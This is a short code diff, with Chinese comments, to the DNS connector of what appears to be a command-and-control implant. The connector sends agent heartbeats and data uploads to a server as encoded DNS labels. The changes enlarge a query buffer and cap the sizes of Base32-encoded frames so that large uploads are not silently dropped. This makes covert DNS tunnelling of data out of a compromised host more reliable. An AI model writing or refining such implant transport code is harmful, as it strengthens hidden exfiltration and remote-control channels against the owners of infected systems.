@@ -151,7 +151,7 @@ static BOOL DnsQueryTxt(const CHAR* qname, const CHAR* resolverRaw, const CHAR* 
 	addr.sin_port = htons(53);
 	memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
 
-	BYTE query[512];
+	BYTE query[4096];
 	memset(query, 0, sizeof(query));
 	USHORT id = (USHORT)(GetTickCount() & 0xFFFF);
 	query[0] = (BYTE)(id >> 8);
@@ -466,7 +466,13 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     // HI：第一次带 beat 的调用仍然沿用原始打包方式（不做应用层分片），
     // 以保持与现有 TsAgentCreate / beat 解析逻辑完全兼容。
     if (!this->hiSent && data && data_size) {
+        // 注意：BuildDataLabelsFromBytes 使用 1024 字节的 dataLabel 缓冲，并且
+        // 在内部先进行 Base32 编码（8/5 膨胀）。为避免编码后长度超出缓冲，
+        // 这里对原始帧大小施加一个保守上限（~600 字节），保证编码后始终可用。
+        const ULONG maxSafeFrame = 600;
         ULONG maxBuf = pkt;
+        if (maxBuf > maxSafeFrame)
+            maxBuf = maxSafeFrame;
         if (data_size && maxBuf > data_size)
             maxBuf = data_size;
         BYTE* encBuf = (BYTE*)MemAllocLocal(maxBuf);
@@ -499,6 +505,14 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         if (maxChunk <= headerSize)
             maxChunk = headerSize + 1;
         maxChunk -= headerSize;
+
+        // 为避免单个 frame 经 Base32 编码后超过 dataLabel 缓冲（1024 字节），
+        // 这里对原始 frame 总长度施加保守上限（~600 字节），对应原始 chunk 约 592 字节。
+        // 这样 BuildDataLabelsFromBytes 在编码/拼接 label 时不会返回 FALSE，
+        // 从而避免大上传任务在 Agent 端被静默丢弃。
+        const ULONG maxSafeFrame = 600;
+        if (maxChunk + headerSize > maxSafeFrame)
+            maxChunk = maxSafeFrame - headerSize;
 
         // 安全上限，避免异常情况占用过多内存；与服务器侧 handlePutFragment 对齐。
         const ULONG maxUploadSize = 4 << 20; // 4MB
